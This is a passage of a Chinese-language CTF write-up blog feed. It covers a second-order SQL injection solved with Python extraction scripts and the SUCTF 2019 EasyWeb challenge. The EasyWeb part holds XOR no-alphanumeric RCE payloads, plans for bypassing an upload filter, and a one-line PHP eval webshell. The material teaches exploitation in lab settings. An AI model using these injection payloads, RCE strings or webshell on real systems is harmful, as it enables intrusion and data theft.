class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># register.php界面</span><br>url1 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># login.php界面</span><br>url2 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># index.php界面</span><br>url3 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/index.php&quot;</span><br><br><span class="hljs-comment"># 设置数据库名的长度</span><br>flag_len = <span class="hljs-number">50</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, flag_len):<br>    <span class="hljs-comment"># 注册</span><br>    paylaod = <span class="hljs-string">&quot;0&#x27;+ascii(substr((select/**/*/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data1 = &#123;<br>        <span class="hljs-comment"># 设置不同的email</span><br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s3&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;username&quot;</span>: paylaod,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>        <br>    &#125;<br>    <span class="hljs-built_in">print</span>(data1)<br>    <span class="hljs-comment"># 上传注册信息</span><br>    r1 = requests.post(url=url1, data=data1)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># 登录</span><br>    data2 = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;s3&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(data2)<br>    <span class="hljs-comment"># 由于login.php登录后location为index.php,所以直接重定向到index.php界面</span><br>    <span class="hljs-comment"># 回显的内容也为index.php界面的</span><br>    r2 = requests.post(url=url2, data=data2)<br>    <span class="hljs-comment"># print(r2.text)</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># 访问index.php</span><br>    <span class="hljs-comment"># r3 = requests.post(url=url3, data=data2)</span><br>    <span class="hljs-comment"># time.sleep(0.03)</span><br>    <span class="hljs-comment"># print(r3.text)</span><br>    <span class="hljs-comment"># 获取username显示的值</span><br>    soup = BeautifulSoup(r2.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    span_elements = soup.find_all(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>    <span class="hljs-comment"># print(span_elements)</span><br>    uername_span_value = span_elements[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(uername_span_value)</span><br>    <span class="hljs-comment"># 回显元素里面的内容</span><br>    <span class="hljs-comment"># print(uername_span_value.text)</span><br>    <br>    <span class="hljs-comment"># 使用正则提取里面的数值</span><br>    <span class="hljs-comment"># pattern = r&#x27;&lt;span\s+class=&quot;user-name&quot;&gt;\s*(\d+)\s*&lt;/span&gt;&#x27;</span><br>    <span class="hljs-comment"># match = re.search(pattern, r2.text)</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, uername_span_value.text)<br>    <span class="hljs-comment"># 获取匹配的内容</span><br>    <span class="hljs-keyword">match</span> = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br>    flag = flag + <span class="hljs-built_in">chr</span>(<span class="hljs-keyword">match</span>)<br>    <br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h4 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h4><p><img src="/images/2024-2-18/image-20240215210700429.png" alt="image-20240215210700429"></p><p>flag&#x3D;flag{8e13d363-3905-4f76-8f9a-b9e17c008355}</p><h3 id="第二种方式：使用16进制获取数据库信息"><a href="#第二种方式：使用16进制获取数据库信息" class="headerlink" title="第二种方式：使用16进制获取数据库信息:"></a>第二种方式：使用16进制获取数据库信息:</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">任何从数据库中查询的数据都可以通过16进制加密后获取，同时hex(hex(xxx))所得到的结果为数字，所以就可以用来配合0&#x27;+(select hex(hex(xxx))) +&#x27;0进行使用，如果只进行一次hex,可能会导致加秘密的结果中含有字母，从而无法进行+的运算。<br></code></pre></td></tr></table></figure><h4 id="获取数据库的信息"><a href="#获取数据库的信息" class="headerlink" title="获取数据库的信息:"></a>获取数据库的信息:</h4><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=s6%40qq.com&amp;username=0&#x27;%2B(select/**/hex(hex(database())))%2B&#x27;0&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215212512151.png" alt="image-20240215212512151"></p><p><img src="/images/2024-2-18/image-20240215212520900.png" alt="image-20240215212520900"></p><h5 id="hex值"><a href="#hex值" class="headerlink" title="hex值:"></a>hex值:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">373736353632<br></code></pre></td></tr></table></figure><h5 id="解密"><a href="#解密" class="headerlink" title="解密:"></a>解密:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">web<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215212632550.png" alt="image-20240215212632550"></p><h4 id="获取flag的值"><a href="#获取flag的值" class="headerlink" title="获取flag的值:"></a>获取flag的值:</h4><h5 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">数据经过两次hex 后，会得到较长的一串只含有数字的字符串，当这个长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度。<br></code></pre></td></tr></table></figure><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">先取flag的前10个字符:<br>email=12345%40qq.com&amp;username=0&#x27;%2B(select/**/hex(hex(substr((select/**/*/**/from/**/flag)/**/from/**/1/**/for/**/10))))%2B&#x27;0&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215214050903.png" alt="image-20240215214050903"></p><p><img src="/images/2024-2-18/image-20240215214102745.png" alt="image-20240215214102745"></p><p>发现采用了科学计数法，所以取10个字符还是太大了。</p><h5 id="使用脚本，每次获取三个字符"><a href="#使用脚本，每次获取三个字符" class="headerlink" title="使用脚本，每次获取三个字符:"></a>使用脚本，每次获取三个字符:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># register.php界面</span><br>url1 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># login.php界面</span><br>url2 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># index.php界面</span><br>url3 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/index.php&quot;</span><br><br><span class="hljs-comment"># 设置数据库名的长度</span><br>flag_len = <span class="hljs-number">50</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, flag_len):<br>    <span class="hljs-comment"># 注册</span><br>    paylaod = <span class="hljs-string">&quot;0&#x27;+(select/**/hex(hex(substr((select/**/*/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/3))))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i*<span class="hljs-number">3</span>-<span class="hljs-number">2</span>)<br>    data1 = &#123;<br>        <span class="hljs-comment"># 设置不同的email</span><br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;666&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;username&quot;</span>: paylaod,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>        <br>    &#125;<br>    <span class="hljs-built_in">print</span>(data1)<br>    <span class="hljs-comment"># 上传注册信息</span><br>    r1 = requests.post(url=url1, data=data1)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># 登录</span><br>    data2 = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;666&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(data2)<br>    <span class="hljs-comment"># 由于login.php登录后location为index.php,所以直接重定向到index.php界面</span><br>    <span class="hljs-comment"># 回显的内容也为index.php界面的</span><br>    r2 = requests.post(url=url2, data=data2)<br>    <span class="hljs-comment"># print(r2.text)</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># 访问index.php</span><br>    <span class="hljs-comment"># r3 = requests.post(url=url3, data=data2)</span><br>    <span class="hljs-comment"># time.sleep(0.03)</span><br>    <span class="hljs-comment"># print(r3.text)</span><br>    <span class="hljs-comment"># 获取username显示的值</span><br>    soup = BeautifulSoup(r2.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    span_elements = soup.find_all(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>    <span class="hljs-comment"># print(span_elements)</span><br>    uername_span_value = span_elements[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(uername_span_value)</span><br>    <span class="hljs-comment"># 回显元素里面的内容</span><br>    <span class="hljs-comment"># print(uername_span_value.text)</span><br>    <br>    <span class="hljs-comment"># 使用正则提取里面的数值</span><br>    <span class="hljs-comment"># pattern = r&#x27;&lt;span\s+class=&quot;user-name&quot;&gt;\s*(\d+)\s*&lt;/span&gt;&#x27;</span><br>    <span class="hljs-comment"># match = re.search(pattern, r2.text)</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, uername_span_value.text)<br>    <span class="hljs-comment"># 获取匹配的内容</span><br>    <span class="hljs-keyword">match</span> = <span class="hljs-keyword">match</span>.group()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br>    <span class="hljs-keyword">try</span>:<br>        byte_object = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-keyword">match</span>)  <span class="hljs-comment"># 解码为字节对象</span><br>        decoded_string = byte_object.decode()<br>        byte_object = <span class="hljs-built_in">bytes</span>.fromhex(decoded_string)  <span class="hljs-comment"># 解码为字节对象</span><br>        result = byte_object.decode()<br>        flag = flag + result<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">continue</span><br>    <br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h5 id="输出-3"><a href="#输出-3" class="headerlink" title="输出:"></a>输出:</h5><p><img src="/images/2024-2-18/image-20240215222233246.png" alt="image-20240215222233246"></p><p>flag&#x3D;flag{8e13d363-3905-4f76-8f9a-b9e17c008355}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[SUCTF 2019]EasyWeb</title>
    <link href="/2024/02/18/2024-02-18-%5BSUCTF%202019%5DEasyWeb/"/>
    <url>/2024/02/18/2024-02-18-%5BSUCTF%202019%5DEasyWeb/</url>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[<a href="https://blog.csdn.net/rfrder/article/details/111207725">SUCTF 2019]EasyWeb-CSDN博客</a></p><p>[<a href="https://www.cnblogs.com/Article-kelp/p/16097100.html">BUUCTF题解][SUCTF 2019]EasyWeb - Article_kelp - 博客园 (cnblogs.com)</a></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240213133746094.png" alt="image-20240213133746094"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计:"></a>代码审计:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 文件上传函数，但是主函数没有执行</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 获取参数_的值，可以用非法传参.代替</span><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// 判断传入的参数是否长度超过18</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><span class="hljs-comment">// 无数字字母rce</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><span class="hljs-comment">// 返回字符串中所有字符出现的次数，以关联数组的形式</span><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-comment">// 统计关联数组有多少个字符类型，不能超过12种</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><span class="hljs-comment">// 危险函数执行</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>根据对主程序的代码审计，我们知道这里我们需要采用无数字字母rce的方式。</p><h2 id="无数字字母rce的payload"><a href="#无数字字母rce的payload" class="headerlink" title="无数字字母rce的payload:"></a>无数字字母rce的payload:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=phpinfo<br>或<br>?.=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=phpinfo<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213151532252.png" alt="image-20240213151532252"></p><p>由于需要利用system(‘ls &#x2F;‘);以及echo <code>ls /</code>;这些代码都是需要进行拼接字符串才可以被eval()执行,如:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$_GET[a]($_GET[b])=&gt;a=system&amp;b=&#x27;ls /&#x27;<br></code></pre></td></tr></table></figure><p>而这样做的结果就是加长了构造的payload字符串导致字符串的长度边长，所含字符的种类变多，从而被拦截</p><p>但是题目中给出了获取flag的函数:get_the_flag,所以我们可以通过调用该函数获取flag</p><h2 id="调用get-the-flag-函数"><a href="#调用get-the-flag-函数" class="headerlink" title="调用get_the_flag()函数:"></a>调用get_the_flag()函数:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213152944988.png" alt="image-20240213152944988"></p><p>没有回显内容，这是因为我们只是调用了该函数，但是没有上传文件。</p><h2 id="对get-the-flag-函数代码审计"><a href="#对get-the-flag-函数代码审计" class="headerlink" title="对get_the_flag()函数代码审计:"></a>对get_the_flag()函数代码审计:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 文件上传函数，但是主函数没有执行</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-comment">// 获取文件的保存路径，需要拼接上我们的ip地址的md5加密字符串</span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>        <span class="hljs-comment">// 创建文件地址</span><br>         <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-comment">// 判断文件内容是否为空</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-comment">// 获取文件名信息</span><br>        <span class="hljs-comment">// 获取暂存文件夹中文件的路径名</span><br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-comment">// 获取文件名</span><br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-comment">// 获取文件的后缀名，获取最后一个.之后的字符串内容</span><br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 判断上传的文件后缀名是否有ph</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>    <span class="hljs-comment">// 获取上传文件的内容，如果含有&lt;?则拦截</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <span class="hljs-comment">//判断文件是否为image类型，通过添加文件头幻术来绕过</span><br>    <span class="hljs-comment">// 上传文件到指定的路径</span><br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.根据代码审计我们知道我们需要上传文件到该网站中，才能成功运行，但是该网站没有提供给我们上传文件的接口，所以我们需要自己创造一个上传文件的接口，将我们本地文件的内容上传到该网站上<br>2.根据代码审计我们发现后缀过滤，但是这种过滤方式可以用.php.进行绕过，或者使用图片后缀名配合.htaccess文件进行绕过<br>3.exif_imagetype($tmp_name)检测文件内容是否为图片类型，使用添加文件幻术头进行绕过，.htaccess中#作为注释，所以可以采用XBM文件的，而上传的PHP代码文件可以添加更为方便的GIF文件的GIF89a66<br>4.mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)对文件php内容的开头进行判断，可以使用&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt;进行绕过，不过前提是php运行内核版本&lt;7.0,或者使用加密内容传输，配合.htaccess文件解密加密的文件内容<br></code></pre></td></tr></table></figure><h2 id="创造上传文件的html"><a href="#创造上传文件的html" class="headerlink" title="创造上传文件的html:"></a>创造上传文件的html:</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 